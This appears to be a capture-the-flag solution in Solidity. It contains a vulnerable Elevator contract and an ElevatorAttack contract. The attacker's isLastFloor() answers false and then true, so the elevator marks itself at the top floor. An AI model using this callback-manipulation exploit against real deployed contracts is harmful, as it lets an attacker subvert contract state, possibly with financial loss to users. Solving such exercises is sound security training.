// SPDX-License-Identifier: MIT
// 0xFaf4CB4f79c4e371Be715A9A006f030E9F9655F9
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorAttack is Building {
    Elevator private immutable elevator;
    uint private  index = 0;
    constructor(address ele) {
        elevator = Elevator(ele);
    }

    function attack() public {
        elevator.goTo(1);
        require(elevator.top() == true, "fail");
    }

    function isLastFloor(uint)  external override returns (bool) {
        if (index == 0) {
            index = index + 1;
            return false;
        } else {
            return true;
        }
    }
}